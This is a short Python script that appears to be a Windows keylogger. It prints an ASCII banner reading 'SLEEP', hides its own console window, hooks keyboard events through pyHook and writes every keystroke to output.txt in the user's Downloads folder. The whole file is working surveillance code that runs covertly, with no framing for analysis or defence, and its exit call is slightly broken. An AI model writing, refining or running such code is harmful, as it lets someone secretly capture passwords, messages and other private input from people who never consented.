import win32console
import win32gui
import pythoncom
import pyHook
import os

print("""
\x1b[38;2;255;255;255m███████╗██╗     ███████╗███████╗██████╗
\x1b[38;2;255;255;255m██╔════╝██║     ██╔════╝██╔════╝██╔══██╗
\x1b[38;2;255;255;255m███████╗██║     █████╗  █████╗  ██████╔╝
\x1b[38;2;255;255;255m╚════██║██║     ██╔══╝  ██╔══╝  ██╔═══╝
\x1b[38;2;255;255;255m███████║███████╗███████╗███████╗██║     
\x1b[38;2;255;255;255m╚══════╝╚══════╝╚══════╝╚══════╝╚═╝     
\x1b[38;2;0;255;58m>(setup)
""")

# Hide the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Define the output file path using the default user path
output_file = os.path.join(os.path.expanduser('~'), 'Downloads', 'output.txt')

# Create or clear the output file at the start
with open(output_file, 'w') as f:
    f.write('Incoming keys:\n')

def OnKeyboardEvent(event):
    if event.Ascii == 5:  # Exit on Ctrl + E
        _exit(1)
    if event.Ascii != 0 and event.Ascii != 8:  # Ignore null and backspace
        with open(output_file, 'a') as f:
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:  # Enter key
                keylogs = '\n'
            f.write(keylogs)  # Append the key logs

# Set up the hook manager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
